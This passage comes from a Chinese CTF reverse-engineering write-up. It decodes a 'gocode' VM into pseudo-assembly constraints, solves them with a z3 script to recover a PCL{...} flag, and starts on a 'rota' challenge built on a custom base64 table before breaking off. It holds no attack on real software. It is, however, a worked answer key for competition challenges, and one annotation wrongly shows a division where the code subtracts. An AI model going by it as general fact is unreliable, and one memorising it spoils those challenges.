</span></span><span class=line><span class=cl>    flag[i] ^= key[i % 4]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag
</span></span></code></pre></td></tr></table></div></div><h3 id=gocode>gocode</h3><p>根据vm的opcode解析伪汇编指令，如下所示。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>user input
</span></span><span class=line><span class=cl>convert input to bytearray
</span></span><span class=line><span class=cl>mov tmp[0], input[0]      
</span></span><span class=line><span class=cl>mov tmp[1], input[1]      
</span></span><span class=line><span class=cl>mov tmp[2], input[2]      
</span></span><span class=line><span class=cl>mov tmp[3], input[3]      
</span></span><span class=line><span class=cl>add tmp[1], tmp[2]        
</span></span><span class=line><span class=cl>mov tmp[2], 283
</span></span><span class=line><span class=cl>eq tmp[1], tmp[2]      input[1]+input[2] == 283
</span></span><span class=line><span class=cl>mov tmp[1], input[1]
</span></span><span class=line><span class=cl>mov tmp[2], input[2]
</span></span><span class=line><span class=cl>add tmp[0], tmp[1]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[2]
</span></span><span class=line><span class=cl>sub tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[2], 30977
</span></span><span class=line><span class=cl>eq tmp[0], tmp[2]     (input[0]+input[1])*input[2]-input[3] == 30977
</span></span><span class=line><span class=cl>mov tmp[2], input[2]
</span></span><span class=line><span class=cl>mov tmp[0], 99
</span></span><span class=line><span class=cl>xor tmp[2], tmp[0]
</span></span><span class=line><span class=cl>mov tmp[0], input[0]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[2]
</span></span><span class=line><span class=cl>sub tmp[0], tmp[1]
</span></span><span class=line><span class=cl>add tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[1], 8182
</span></span><span class=line><span class=cl>eq tmp[0], tmp[1]      input[0]*(input[2]^99) - input[1] + input[3] == 8182
</span></span><span class=line><span class=cl>mov tmp[1], input[1]
</span></span><span class=line><span class=cl>mov tmp[0], input[0]
</span></span><span class=line><span class=cl>mov tmp[2], input[2]
</span></span><span class=line><span class=cl>add tmp[1], tmp[0]
</span></span><span class=line><span class=cl>add tmp[1], tmp[2]
</span></span><span class=line><span class=cl>add tmp[1], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[0], 542
</span></span><span class=line><span class=cl>eq tmp[1], tmp[0]       input[1]+input[0]+input[2]+input[3] == 542
</span></span><span class=line><span class=cl>mov tmp[1], input[1]
</span></span><span class=line><span class=cl>mov tmp[0], input[0]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[3]
</span></span><span class=line><span class=cl>sub tmp[0], tmp[1]
</span></span><span class=line><span class=cl>add tmp[0], tmp[2]
</span></span><span class=line><span class=cl>mov tmp[3], 13105
</span></span><span class=line><span class=cl>eq tmp[0], tmp[3]       input[0]*input[3] - input[1] + input[2] == 13105
</span></span><span class=line><span class=cl>mov tmp[0], input[4]       
</span></span><span class=line><span class=cl>mov tmp[1], input[5]
</span></span><span class=line><span class=cl>mov tmp[2], input[6]
</span></span><span class=line><span class=cl>mov tmp[3], 99               [input[4], input[5], input[6], 99]
</span></span><span class=line><span class=cl>add tmp[0], tmp[3]           [input[4]+99, input[5], input[6], 99]
</span></span><span class=line><span class=cl>mov tmp[3], 104              [input[4]+99, input[5], input[6], 104]
</span></span><span class=line><span class=cl>xor tmp[0], tmp[3]           [(input[4]+99)^104, input[5], input[6], 104]
</span></span><span class=line><span class=cl>mov tmp[3], 338              [(input[4]+99)^104, input[5], input[6], 338]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[3]      (input[4]+99)^104 == 338
</span></span><span class=line><span class=cl>mov tmp[3], 51               [(input[4]+99)^104, input[5], input[6], 51]
</span></span><span class=line><span class=cl>sub tmp[1], tmp[3]           [(input[4]+99)^104, input[5]-51, input[6], 51]
</span></span><span class=line><span class=cl>mov tmp[3], 99               [(input[4]+99)^104, input[5]-51, input[6], 99]
</span></span><span class=line><span class=cl>mul tmp[1], tmp[3]           [(input[4]+99)^104, (input[5]-51)*99, input[6], 99]
</span></span><span class=line><span class=cl>mov tmp[0], 1089             [1089, (input[5]-51)*99, input[6], 99]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[1]      (input[5]-51)*99 == 1089
</span></span><span class=line><span class=cl>mov tmp[3], 99               
</span></span><span class=line><span class=cl>xor tmp[2], tmp[3]           [1089, (input[5]-51)*99, input[6]^99, 99]
</span></span><span class=line><span class=cl>mov tmp[3], 107
</span></span><span class=line><span class=cl>add tmp[2], tmp[3]           [1089, (input[5]-51)*99, input[6]^99 + 107, 107]
</span></span><span class=line><span class=cl>mov tmp[1], 270              [1089, 270, input[6]^99 + 107, 107]
</span></span><span class=line><span class=cl>eq tmp[2], tmp[1]      (input[6]^99) + 107 == 270
</span></span><span class=line><span class=cl>mov tmp[1], 158              [1089, 158, input[6]^99 + 107, 107]
</span></span><span class=line><span class=cl>mov tmp[0], input[7]         [input[7], 158, input[6]^99 + 107, 107]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[1]      input[7] == 158
</span></span><span class=line><span class=cl>mov tmp[0], input[8]         
</span></span><span class=line><span class=cl>mov tmp[1], input[9]
</span></span><span class=line><span class=cl>mov tmp[2], input[10]
</span></span><span class=line><span class=cl>mov tmp[3], input[11]        [input[8], input[9], input[10], input[11]]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[3], 14030            [input[8]*input[11], input[9], input[10], 14030]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[3]      input[8]*input[11] == 14030
</span></span><span class=line><span class=cl>mov tmp[0], input[8]
</span></span><span class=line><span class=cl>mov tmp[3], input[11]        [input[8], input[9], input[10], input[11]]
</span></span><span class=line><span class=cl>add tmp[0], tmp[1]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[2]
</span></span><span class=line><span class=cl>sub tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[2], 26669            [(input[8]+input[9])*input[10]-input[11], input[9], 26669, input[11]]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[2]      (input[8]+input[9])*input[10]/input[11] == 26669
</span></span><span class=line><span class=cl>mov tmp[2], input[10]        
</span></span><span class=line><span class=cl>mov tmp[0], 99               [99, input[9], input[10], input[11]]
</span></span><span class=line><span class=cl>xor tmp[2], tmp[0]
</span></span><span class=line><span class=cl>mov tmp[0], input[8]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[2]
</span></span><span class=line><span class=cl>sub tmp[0], tmp[1]
</span></span><span class=line><span class=cl>add tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[1], 21               [input[8]*(input[10]^99)-input[9]+input[11], 21, (input[10]^99), input[11]]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[1]        input[8]*(input[10]^99)-input[9]+input[11] == 21
</span></span><span class=line><span class=cl>mov tmp[1], input[9]
</span></span><span class=line><span class=cl>mov tmp[0], input[8]
</span></span><span class=line><span class=cl>mov tmp[2], input[10]        [input[8], input[9], input[10], input[11]]
</span></span><span class=line><span class=cl>add tmp[1], tmp[0]
</span></span><span class=line><span class=cl>add tmp[1], tmp[2]
</span></span><span class=line><span class=cl>add tmp[1], tmp[3]      
</span></span><span class=line><span class=cl>mov tmp[0], 430             [430, input[9]+input[8]+input[10]+input[11], input[10], input[11]]
</span></span><span class=line><span class=cl>eq tmp[1], tmp[0]       input[9]+input[8]+input[10]+input[11] == 430
</span></span><span class=line><span class=cl>mov tmp[1], input[9]
</span></span><span class=line><span class=cl>mov tmp[0], input[8]        [input[8], input[9], input[10], input[11]]
</span></span><span class=line><span class=cl>mul tmp[0], tmp[3]
</span></span><span class=line><span class=cl>sub tmp[0], tmp[1]
</span></span><span class=line><span class=cl>add tmp[0], tmp[2]
</span></span><span class=line><span class=cl>mov tmp[3], 14089           [input[8]*input[11] - input[9]+input[10], input[9], input[10], 14089]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[3]     input[8]*input[11] - input[9]+input[10] == 14089
</span></span><span class=line><span class=cl>mov tmp[0], input[12]
</span></span><span class=line><span class=cl>mov tmp[1], input[13]
</span></span><span class=line><span class=cl>mov tmp[2], input[14]       
</span></span><span class=line><span class=cl>mov tmp[3], 99              [input[12], input[13], input[14], 99]
</span></span><span class=line><span class=cl>add tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[3], 104
</span></span><span class=line><span class=cl>xor tmp[0], tmp[3]
</span></span><span class=line><span class=cl>mov tmp[3], 250             [(input[12]+99)^104, input[13], input[14], 250]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[3]    (input[12]+99)^104 == 250
</span></span><span class=line><span class=cl>mov tmp[3], 30             [(input[12]+99)^104, input[13], input[14], 30]
</span></span><span class=line><span class=cl>sub tmp[1], tmp[3]         [(input[12]+99)^104, input[13]-30, input[14], 30]
</span></span><span class=line><span class=cl>mov tmp[3], 99
</span></span><span class=line><span class=cl>mul tmp[1], tmp[3]         [(input[12]+99)^104, (input[13]-30)*99, input[14], 99]
</span></span><span class=line><span class=cl>mov tmp[0], 396            [396, (input[13]-30)*99, input[14], 99]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[1]    (input[13]-30)*99 == 396
</span></span><span class=line><span class=cl>mov tmp[3], 99            
</span></span><span class=line><span class=cl>xor tmp[2], tmp[3]         [396, (input[13]-30)*99, input[14]^99, 99]
</span></span><span class=line><span class=cl>mov tmp[3], 107
</span></span><span class=line><span class=cl>add tmp[2], tmp[3]         
</span></span><span class=line><span class=cl>mov tmp[1], 131            [396, 131, (input[14]^99)+107, 107]
</span></span><span class=line><span class=cl>eq tmp[2], tmp[1]   (input[14]^99)+107 == 131
</span></span><span class=line><span class=cl>mov tmp[1], 71             
</span></span><span class=line><span class=cl>mov tmp[0], input[15]      [input[15], 71, (input[14]^99)+107, 107]
</span></span><span class=line><span class=cl>eq tmp[0], tmp[1]    input[15] == 71
</span></span><span class=line><span class=cl>index &gt;= 374
</span></span></code></pre></td></tr></table></div></div><p>首先检查输入格式，长度37，{}中有32个字符，之后按16进制转换为字节序列，再对转换得到的16个字节进行校验，用z3求解即可。脚本如下。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>z3</span> <span class=n>import</span> <span class=o>*</span>   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>global</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>s</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>!=</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;failed!&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=k>var</span> <span class=ow>in</span> <span class=n>input</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>+=</span> <span class=n>hex</span><span class=p>(</span><span class=n>m</span><span class=p>[</span><span class=k>var</span><span class=p>]</span><span class=o>.</span><span class=n>as_long</span><span class=p>())[</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>input</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=n>f</span><span class=s2>&#34;input{i}&#34;</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=mi>283</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>*</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>30977</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>^</span><span class=mi>99</span><span class=p>)</span> <span class=o>-</span> <span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>8182</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>542</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>-</span> <span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=mi>13105</span><span class=p>,)</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>input</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=n>f</span><span class=s2>&#34;input{i}&#34;</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=mi>51</span><span class=p>)</span><span class=o>*</span><span class=mi>99</span> <span class=o>==</span> <span class=mi>1089</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=mi>99</span><span class=p>)</span><span class=o>^</span><span class=mi>104</span> <span class=o>==</span> <span class=mi>338</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>^</span><span class=mi>99</span><span class=p>)</span> <span class=o>+</span> <span class=mi>107</span> <span class=o>==</span> <span class=mi>270</span><span class=p>,)</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># print(hex(158))</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>+=</span> <span class=s1>&#39;9e&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>input</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=n>f</span><span class=s2>&#34;input{i}&#34;</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>14030</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>*</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>26669</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>^</span><span class=mi>99</span><span class=p>)</span><span class=o>-</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>21</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>430</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>-</span> <span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=mi>14089</span><span class=p>,)</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>input</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=n>f</span><span class=s2>&#34;input{i}&#34;</span><span class=p>,</span><span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>input</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=mi>99</span><span class=p>)</span><span class=o>^</span><span class=mi>104</span> <span class=o>==</span> <span class=mi>250</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=mi>30</span><span class=p>)</span><span class=o>*</span><span class=mi>99</span> <span class=o>==</span> <span class=mi>396</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>^</span><span class=mi>99</span><span class=p>)</span><span class=o>+</span><span class=mi>107</span> <span class=o>==</span> <span class=mi>131</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>==</span> <span class=mi>71</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># bdcc4f46 d73ec0 9e e628633d 2f227b47</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;PCL{&#39;</span><span class=o>+</span><span class=n>flag</span><span class=o>+</span><span class=s1>&#39;}&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=rota>rota</h3><p>换表base64 dump出maps和box</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Maps = bytearray(b&#39;XiIzDuAoGlaK6JcjM3g/9YQmHBOsxn1hLZ4w7Tt0PV5pNqUFC+rE2dSfyvWe8kRb=&#39;)
</span></span><span class=line><span class=cl>sbox = [0x33, 0x34, 0x2C, 0x36, 0x1D, 0x12, 0x1E, 0x0C, 0x1A, 0x3C, 0x29, 0x10, 0x20, 0x14, 0x3D, 0x3B, 0x19, 0x08, 0x0E, 0x1F, 0x30, 0x05, 0x38, 0x03, 0x11, 0x1B, 0x17, 0x21, 0x2E, 0x04, 0x18, 0x23, 0x2B, 0x02, 0x27, 0x37, 0x1C, 0x24, 0x39, 0x3F, 0x35, 0x2D, 0x26, 0x13, 0x2A, 0x0A, 0x00, 0x07, 0x3E, 0x01, 0x28, 0x2F, 0x32, 0x22, 0x0D, 0x06, 0x25, 0x3A, 0x09, 0x0F, 0x16, 0x0B, 0x15, 0x31, 0x0C, 0x2C, 0x0D, 0x21, 0x22, 0x09, 0x02, 0x39, 0x31, 0x17, 0x1A, 0x33, 0x06, 0x24, 0x10, 0x04, 0x1B, 0x0B, 0x34, 0x12, 0x38, 0x27, 0x0E, 0x20, 0x2B, 0x2E, 0x00, 0x13, 0x3E, 0x3A, 0x05, 0x1E, 0x36, 0x08, 0x32, 0x29, 0x19, 0x23, 0x3D, 0x3B, 0x3C, 0x3F, 0x37, 0x30, 0x18, 0x16, 0x35, 0x25, 0x0A, 0x2D, 0x28, 0x26, 0x15, 0x11, 0x07, 0x1D, 0x2A, 0x0F, 0x1F, 0x14, 0x01, 0x1C, 0x03, 0x2F, 0x13, 0x0D, 0x35, 0x31, 0x07, 0x11, 0x1B, 0x23, 0x0B, 0x0C, 0x10, 0x25, 0x2B, 0x21, 0x33, 0x18, 0x27, 0x29, 0x02, 0x2F, 0x28, 0x30, 0x0E, 0x19, 0x3C, 0x08, 0x34, 0x20, 0x3D, 0x2E, 0x05, 0x15, 0x2C, 0x1C, 0x36, 0x22, 0x1E, 0x24, 0x38, 0x0A, 0x3F, 0x1A, 0x04, 0x26, 0x16, 0x2A, 0x3A, 0x1F, 0x2D, 0x32, 0x06, 0x37, 0x03, 0x3B, 0x00, 0x17, 0x1D, 0x12, 0x09, 0x01, 0x3E, 0x39, 0x0F, 0x14, 0x00, 0x00, 0x00, 0x3F, 0xFB, 0x7F, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0xFB, 0x7F, 0x00, 0x00, 0x6B, 0x73, 0x50, 0x68, 0x53, 0x2F, 0x33, 0x34, 0x4D, 0x58, 0x69, 0x66, 0x6A, 0x2B, 0x49, 0x62, 0x74, 0x6A, 0x75, 0x64, 0x32, 0x54, 0x69, 0x6B, 0x6A, 0x35, 0x48, 0x6B, 0x41, 0x37, 0x69, 0x54, 0x70, 0x62, 0x61, 0x4E, 0x45, 0x4C, 0x42, 0x65, 0x62, 0x4F, 0x61, 0x49, 0x6D, 0x00, 0x00, 0x00]
</span></span></code></pre></td></tr></table></div></div><p>base64之后的加密</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
